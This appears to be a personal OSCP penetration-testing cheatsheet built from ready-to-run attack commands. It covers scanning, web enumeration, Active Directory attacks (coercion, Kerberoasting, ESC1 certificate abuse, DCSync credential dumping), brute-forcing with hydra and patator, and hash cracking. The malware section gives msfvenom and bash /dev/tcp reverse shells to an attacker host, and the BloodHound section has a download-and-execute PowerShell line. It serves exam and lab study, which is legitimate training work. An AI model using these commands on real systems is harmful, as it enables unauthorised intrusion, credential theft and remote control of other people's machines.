# OSCP Cheatsheet
Your content here
## Formatting Requirements
- Capitalization and underscores (`File_Name.txt`)
- `host.domain.tld` preferred (e.g., Kerberos) over `#.#.#.#` unless required. Or `attack.domain.tld` where necessary.
- Keep any variables to be modified to the left in a command (to enable faster CLI modification)
- Prefer single quotes
- Single quote usernames (Unquoted `PC$` would break the command)
- Quote all paths
- Use `$HtB` and `$Tools` paths (set in `~/.zshrc`)
- Only add `sudo` if actually required
- Specify `tun0` whenever possible to prevent adapter issues from arising

## General Resources
- https://ippsec.rock

## Port/OS Discovery
```
sudo masscan -p1-65535,U:1-65535 --rate=500 -e tun0 #.#.#.#
```
1. Paste results into Sublime and enable regex
2. Move UDP to the top of the page
3. Find `^.*rt `, Find All, backspace
4. Find `/.*$`, Find All, backspace
5. Find `\n`, Find All, backspace, enter `n`, Delete key
```
nmap host.domain.tld -p 22,80 -Pn -sC -sV --open -e tun0 -oA '.\nmap_TCP_Initial'
```
```
sudo nmap host.domain.tld -p 53,135 -Pn -sC -sV --open -e tun0 -sU -oA '.\nmap_UDP_Initial'
```
```
ping host.domain.tld
```
- TTL 254 = Cisco default
- TTL 127 = Windows default
- TTL 64  = Linux default
## Web Application Security
Your content here
- File/Directory Enumeration
- Virtual Host Enumeration
- View Source Code / Inspect Console
- Directory Traversal
- Directory Listing
- Patch checks
- Password Guessing
- 403 forbidden bypass
- SQL Injection
- LFI/RFI
- User enumeration

Resources:
- https://github.com/riramar/Web-Attack-Cheat-Sheet

### File/Directory Enumeration
```
feroxbuster -u http://host.domain.tld -f -n -C 404 -A -e -S 0 --auto-tune
feroxbuster -u http://host.domain.tld -x html,php,txt -C 404 -A -e -S 0 --auto-tune
feroxbuster -u http://host.domain.tld/cgi-bin -x cgi,pl,py,sh -C 404 -A -e -S 0 --auto-tune
feroxbuster -u http://host.domain.tld -C 404 -A -e -S 0 --wordlist '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt' --auto-tune
feroxbuster -u http://host.domain.tld -x html,php -C 404 -A -e -S 0 --wordlist '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt' --auto-tune
```
- .asp, .aspx
### Virtual Host (subdomain) Enumeration
```
gobuster vhost -u host.domain.tld -w '/usr/share/wordlists/amass/subdomains-top1mil-5000.txt' -t 50 --append-domain 
```
### Parameter Mining
- https://github.com/s0md3v/Arjun

```
arjun -u 'http://host.domain.tld?id=1'
```
```
arjun -u 'http://host.domain.tld?id=1' --stable
```
### Directory Traversal
- https://github.com/jcesarstef/dotdotslash
- `/etc/passwd` (readable by all users)
- `/var/www/html` (Apache2)
- `\windows\win.ini` (readable by all users) (slashes don't necessarily matter)
- `C:\inetpub\wwwroot`
- ?param=phpinfo();
- https://gist.github.com/jonlabelle/3f9aa4a5f3a2e41b7b4a81232047435c

```
python "$Tools/dotdotslash/dotdotslash.py" --url 'http://host.domain.tld/bWAPP/directory_traversal_1.php?page=/etc/passwd' --string '/etc/passwd' --cookie 'PHPSESSID=<ID>; security_level=3'
```
### Vulnerability Scanning
- https://github.com/sullo/nikto

```
nikto -host='http://host.domain.tld'
```
### SQL Injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet
### Bypass 403
- https://github.com/iamj0ker/bypass-403

```
bash "$Tools/bypass-403/bypass-403.sh" host.domain.tld index.html
```
### User Enumeration
Locations:
- Static site content
People:
- Customers
- Team members
### Sensitive Information
```
curl 'http://host/domain.tld/index.html' | grep -oE '\w+' | sort -u -f | more
cewl
```
### IIS
**WebDAV**
```
nmap host.domain.tld -p 80 -Pn --script http-iis-webdav-vuln -e tun0
```
## Linux/UNIX Security
Your content here
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- https://pentestmonkey.net/tools/audit/unix-privesc-check
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
```
sudo -l
getcap -r / 2>/dev/null
su - root
su - root '/bin/Web-Attack-Cheat-Sheet'
find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null
```
Obtain Real Shell (TTY/etc.)
```
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo
fg
reset
xterm-color
```
### MySQL
```
nmap host.domain.tld -p 3306 -Pn --script mysql-*
mysql -u 'User' -p'Password123!' -h host.domain.tld
```
## Windows and AD Security
Your content here
### Anonymous
Your content here
#### DNS
```
dnsrecon -n #.#.#.# -d domain.tld -a -x './dnsrecon.xml' -c './dnsrecon.csv'
```
#### LDAP(S)
- https://github.com/CroweCybersecurity/ad-ldap-enum
- https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
- https://github.com/garrettfoster13/pre2k-TS
- LDAP insensitive terms (`grep -i 'pattern' 'File.txt'`): password, pwd, secret
```
python "$Tools/ad-ldap-enum/ad-ldap-enum.py" -l host.domain.tld -d domain.tld -n -o 'ad-ldap-enum_Anon_'
openssl s_client host.domain.tld:636
ldapsearch -h host.domain.tld -x -b "DC=domain,DC=tld" > './ldapsearch_anon.txt'
ldapsearch -h host.domain.tld -x -b "DC=domain,DC=tld" '(objectClass=person)' > './ldapsearch_anon_person.txt'
cat './ldapsearch_anon.txt' \ awk '{print #1}' | sort | uniq -c | sort -n
cat './ldapsearch_anon.txt' \ awk '{print #1}' | sort | uniq -c | sort -n | grep ':'
```
#### RPC
- https://github.com/cddmp/enum4linux-ng
- https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
- https://github.com/p0dalirius/Coercer
```
python "$Tools/enum4linux-ng/enum4linux-ng.py" -C host.domain.tld -A -R -Gm -oA '<full-path>/enum4linux-ng_Anon'
grep 'username\:.*' 'enum4linux-ng_Anon.yaml' | cut -d : -f 2 > 'Domain_Users.txt'
```
```
impacket-rpcdump host.domain.tld
ridenum host.domain.tld 500 50000
rpcclient host.domain.tld -U '' -N
rpcclient host.domain.tld -U 'User' -N
rpcclient host.domain.tld -U 'Guest' -N
```
```
sudo responder -I tun0 -A --lm
sudo responder -I tun0 -A
python "$Tools/PetitPotam/PetitPotam.py" attack.domain.tld host.domain.tld -pipe all
python "$Tools/PetitPotam/PetitPotam.py" attack@80/index.html host.domain.tld -pipe all
python "$Tools/PetitPotam/PetitPotam.py" attack.domain.tld@80/index.html host.domain.tld -pipe all
```
#### SMB
- https://github.com/crowecybersecurity/shareenum
```
nmap host.domain.tld --script smb-vuln* -p 137,139,445 -Pn -e tun0 -oA './nmap_smb_vuln'
smbclient -L ////host.domain.tld -U '' -N
smbclient -L ////host.domain.tld -U 'User' -N
smbclient -L ////host.domain.tld -U 'Guest' -N
smbclient '//host.domain.tld/Share' -U '' -N
smbclient '//host.domain.tld/Share' -U 'User' -N
smbclient '//host.domain.tld/Share' -U 'Guest' -N
"$Tools/shareenum/src/shareenum" host.domain.tld -o './shareenum_Anon.csv'
impacket-Get-GPPPassword domain.tld/@host.domain.tld
```
smbclient, pull all files in share:
```
mask ''
recurse ON
prompt OFF
mget *
```
#### Kerberos
- https://github.com/ropnop/kerbrute
```
"$Tools/kerbrute_linux_amd64" userenum --dc host.domain.tld -d domain.tld 'Domain_Users.txt' -o 'kerbrute_Results.txt'
sudo ntpdate host.domain.tld
impacket-GetNPUsers domain.tld/ -usersfile 'Domain_Users.txt' -outputfile 'Impacket_ASREPRoast_Anon.txt'
```
#### Microsoft SQL
```
nmap host.domain.tld -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info -e tun0 -oA 'nmap_mssql'
```
#### SMTP
```
nmap host.domain.tld --script smtp-vuln-* -p 25 -Pn -e tun0 -oA 'nmap_smtp_vuln'
```
#### Patch Management
Don't expect a patch to be missing in the real world, but we're in the fake world:
- [EternalBlue](https://github.com/3ndG4me/AutoBlue-MS17-010)
- [PrintNightmare](https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527)
- [NoMIC](https://github.com/fox-it/cve-2019-1040-scanner)
- [ZeroLogon](https://github.com/dirkjanm/CVE-2020-1472)
- [SIGRed](https://github.com/chompie1337/SIGRed_RCE_PoC)
- [NoPAC](https://github.com/Ridter/noPac)
- [PrivExchange](https://github.com/dirkjanm/PrivExchange)
- [ShellShock](https://github.com/b4keSn4ke/CVE-2014-6271)
```
python "$Tools/AutoBlue/eternal_checker.py" host.domain.tld
```
```
python "$Tools/Shellshock-CVE-2014-6271/shellshock.py" #.#.#.# #### 'http://host.domain.tld/cgi-bin/<vulnerable-script>'
```
### Authenticated
Your content here
#### SMB
- [LnkBomb](https://github.com/dievus/lnkbomb)
```
"$Tools/shareenum/src/shareenum" host.domain.tld -u 'Domain\User' -p 'Password123!' -o './shareenum_Auth.csv'
smbclient -L ////host.domain.tld -U 'User' --password 'Password123!'
smbclient '//host.domain.tld/Share' -U 'User' --password 'Password123!'
smbmap -H host.domain.tld -u 'User' -p 'Password123!' -d domain.tld -R
crackmapexec smb host.domain.tld -u 'User' -p 'Password123!' -d domain.tld --shares
impacket-Get-GPPPassword domain.tld/'User':'Password123!'@host.domain.tld
sudo mount -t cifs -o 'username=User,password=Password123!' '//host.domain.tld/share' '/mnt/share'
```
#### LDAP(S)
- https://github.com/CroweCybersecurity/ad-ldap-enum
- https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
```
python "$Tools/ad-ldap-enum/ad-ldap-enum.py" -l host.domain.tld -d domain.tld -u 'User' -p 'Password123!' -o 'ad-ldap-enum_Auth_'
```
#### Kerberos
```
impacket-GetNPUsers domain.tld/'User':'Password123!' -outputfile 'Impacket_ASREPRoast_Auth.txt'
impacket-GetUserSPNs domain.tld/'User':'Password123!' -dc-ip host.domain.tld -outputfile 'Impacket_Kerberoast.txt' -Request
```
#### Microsoft SQL
- DBeaver: Fix theme colors: Window > Preferences> General > Appearance > Theme
- [MSDAT - Known to have an xp_dirtree problem ](https://github.com/quentinhardy/msdat/issues/14)
```
patator mssql_login host=host.domain.tld user='User' password='Password123!' windows_auth=0 --max-retries=0 --csv='mssql_single.csv'
impacket-mssqlclient 'User':'Password123!'@host.domain.tld
python "$Tools/msdat/msdat.py" all -s host.domain.tld -U 'User' -P 'Password123!'
```
#### PSRemoting / WinRM
```
$P = 'PS_Credential_Hash' | ConvertTo-SecureString
$P = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object -Typename System.Management.Automation.PSCredential('domain.tld\User', $P)
$Cred.GetNetworkCredential() | Format-List
Invoke-Command -Computername host.domain.tld -ScriptBlock { Get-ChildItem '$env:homedrive\Users\User\Desktop' } -Credential $Cred
```
```
evil-winrm -u 'User' -p 'Password123!' -i host.domain.tld
evil-winrm -u 'User' -H '31d6cfe0d16ae931b73c59d7e0c089c0' -i host.domain.tld
upload /full/path/file.exe
download file.exe
gci -hidden ./
```
```
impacket-wmiexec domain.tld/'User':'Password123!'@host.domain.tld
```
#### Lay-of-the-Land
```
whoami /all
Get-MpComputerStatus
```
#### Certificate Services
- https://github.com/zer1t0/certi
- https://github.com/ly4k/Certipy
- https://github.com/GhostPack/Certify

**ESC1**
```
./Certify.exe cas /quiet
./Certify.exe find /quiet /vulnerable /currentuser
./Certify.exe request /ca:'host.domain.tld\CA' /template:'Template' /altname:'User' /quiet
```
Copy both private key and certificate into cert.pem and then:
```
openssl pkcs12 -in 'Cert.pem' -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out 'Cert.pfx'
```
- https://github.com/fortalice/modifyCertTemplate
- https://github.com/GhostPack/Rubeus
```
Rubeus.exe asktgt /user:'User' /certificate:'.\Cert.pfx' /getcredentials
```
- https://github.com/dirkjanm/PKINITtools
- https://github.com/AlmondOffSec/PassTheCert

#### BloodHound
```
iex(New-Object Net.WebClient).downloadString('http://#.#.#.#/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All
dir "C:\program files\MSBuild\MIcrosoft\Windows Workflow Foundation\
```
```
python -m bloodhound -c All -d domain.tld -u 'User' -p 'Password123! -ns #.#.#.#
```
- Look for odd stuff (the path) (mark as high-value)
- Domain Users <> Domain Computers and to each other
```
sudo neo4j console
bloodhound --no-sandbox
```
#### DACL Exploitation
Your content here
- https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html
**ForceChangePassword**
- Make sure the password complexity requirement is met, and the username is not within the password
```
rpcclient host.domain.tld -U 'User' --password 'Password123!' 
setuserinfo2 'User' 23 'Password123!'
```
**GenericAll/Write/Owner/FullControl**
- https://github.com/fortra/impacket/pull/1291
```
python "$Tools/impacket-dacledit/examples/dacledit.py" domain.tld/'User':'Password123!' -dc-ip host.domain.tld -principal 'User' -target 'Victim' -action read -debug
```
#### DCSync
- https://github.com/skelsec/pypykatz
- SAM and NTDS administrator passwords can be mismatched
- Computers rotate their passwords at maximum of 30 days
```
impacket-secretsdump domain.tld/'User':'Password123!'@host.domain.tld
```
## Password Guessing
Your content here
### HTTP(S)
```
hydra -l 'User' -P rockyou-50.txt host.domain.tld http-post-form "/site/login.php:<requestuser=^USER^&pass=^PASS^>:<failure string>"
```
### SMB
- `grep -v 'FAILURE' 'smb_user_pass.csv'`
```
patator smb_login host=host.domain.tld user='User' password='Password123!' domain=domain.tld port=445 --max-retries=0 --csv='patator_smb_single.csv'
```
```
patator smb_login host=host.domain.tld password='Password123!' user=FILE0 port=445 0='/usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt' --max-retries=0 --csv='patator_smb_user.csv'
```
```
patator smb_login host=host.domain.tld user='User' domain=domain.tld password=FILE0 port=445 0='/usr/share/wordlists/rockyou.txt' --max-retries=0 --csv='patator_smb_pass.csv'
```
```
patator smb_login host=host.domain.tld domain=domain.tld user=FILE0 password=FILE1 port=445 0='Domain_Users.txt' 1='/usr/share/wordlists/rockyou.txt' --max-retries=0 --csv='patator_smb_user_pass.csv'
```
```
patator smb_login host=host.domain.tld domain=domain.tld user=FILE0 password=FILE1 port=445 0='Domain_Users.txt' 1='Domain_Users.txt' --max-retries=0 --csv='patator_smb_domain_user.csv'
```
```
patator smb_login host=host.domain.tld domain=domain.tld user=FILE0 password='' port=445 0='Domain_Users.txt' --max-retries=0 --csv='patator_smb_domain_null.csv'
```
### SSH
```
patator ssh_login host=host.domain.tld user='User' password='Password123!' port=22 --max-retries=0 --csv='patator_ssh_single.csv'
```
```
patator ssh_login host=host.domain.tld password='Password123!' port=22 user=FILE0 0='/usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt' --max-retries=0 --csv='patator_ssh_user.csv'
```
```
patator ssh_login host=host.domain.tld user='User' port=22 password=FILE0 0='/usr/share/wordlists/rockyou.txt' --max-retries=0 --csv='ssh_pass.csv'
```
### SMTP
```
"$Tools/GoMapEnum" userenum smtp -t host.domain.tld -d domain.tld -u '/usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt'
```
- Any external emails are false positives as the mail server cannot verify external domains
### SNMPv1/2
```
onesixtyone host.domain.tld -c '/usr/share/wordlists/metasploit/snmp_default_pass.txt'
```
## Hashcat/John
NameThatHash (nth)

**NetNTLMv2**
```
hashcat -m 5600 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_NTLMv2.txt'
```
**ASREPRoast - RC4**
```
hashcat -m 18200 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_ASREPRoast_RC4.txt'
```
**Kerberoast - RC4**
```
hashcat -m 13100 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_Kerberoast_RC4.txt'
```
**MD5**
```
hashcat -m 0 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_MD5.txt'
```
Wordlist Generation w/ Rules
```
hashcat --force './Hashcat_PW_Input.txt' -r '/usr/share/hashcat/rules/best64.rule' --stdout > 'Hashcat_PW_Output_Dupped.txt'
sort -u 'Hashcat_PW_Output_Dupped.txt' 'Hashcat_PW_Output_Unique.txt'
```
**Encrypted Zip**
```
zip2john 'File.zip' > 'John_Zip_Hash.txt'
john --wordlist='/usr/share/wordlists/rockyou.txt' 'John_Zip_Hash.txt'
```
## Data Obfusication
Your content here
**Base64 String Decode**
```
echo 'acd==' | base64 -d
```
**File Metadata/String**
```
file file.txt
exiftool file.txt
```
## Malware/Exploits
- Word > Insert > Quick Parts > Field > Links and References > Include picture > http://#.#.#.#/canary.jpg
	- Works on WordPad and Office (licensing problems)
### Reverse Shell
```
msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f hta-psh LHOST=#.#.#.# LPORT=9000 > 'reverse64bit.hta'
msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll LHOST=#.#.#.# LPORT=9000 > 'reverse64bit.dll'
sudo nc -nlvp 9000
"bash -c 'bash -i >& /dev/tcp/#.#.#.#/#### 0>&1'"
```
### Exploit
- https://www.exploit-db.com/
```
searchsploit term
cp /usr/share/exploitdb/exploits/<path> ./
```
## Attacker Local
Your content here
### Python
**Python Virtual Environment (pyenv)**
```
pyenv virtualenv system/3.X pyenv-venv-tool
pyenv global pyenv-venv-tool
exec $SHELL
pyenv versions
# Never use sudo
pyenv virtualenv-delete pyenv-venv-tool
```
**Change Python Versions**
- https://github.com/pyenv/pyenv

```
pyenv versions
pyenv global #.#
exec $SHELL
```
**Python 2.7 Pip Install**
```
curl 'https://bootstrap.pypa.io/pip/2.7/get-pip.py' --output 'get-pip.py'
python2 './get-pip.py'
```
### Script Debugging
**Python 2.7**
```
import pdb
pdb.set_trace()
```
After running the code, execute debugging commands during the debug break:
```
print var
```
### Firefox Customization
Extensions
- https://addons.mozilla.org/en-US/firefox/addon/burp-proxy-toggler-lite/
- https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
- https://addons.mozilla.org/en-US/firefox/addon/darkreader/
- https://addons.mozilla.org/en-US/firefox/addon/markdown-viewer-chrome/
### Add Source
The following method avoids the `apt-key` deprecation warning:
```
wget -qO - 'https://domain.tld/software.pgp.key' | sudo gpg --dearmor -o '/etc/apt/trusted.gpg.d/software.gpg'
echo 'deb https://domain.tld stable latest' > '/etc/apt/sources.list.d/software.list'
sudo apt update
sudo apt update
apt-cache policy
```
## Host Servers
```
python2 -m SimpleHTTPServer 80
python3 -m http.server 80
impacket-smbserver share './'' -smb2support -debug
```
## Connections
**RDP**
```
xfreerdp /u:'User' /p:'Password123!' /v:host.domain.tld:3389
xfreerdp /u:'domain.tld\User' /p:'Password123!' /v:host.domain.tld:3389
```
**SCP**
```
scp 'local-file.txt' User@host.domain.tld:'/home/user'
```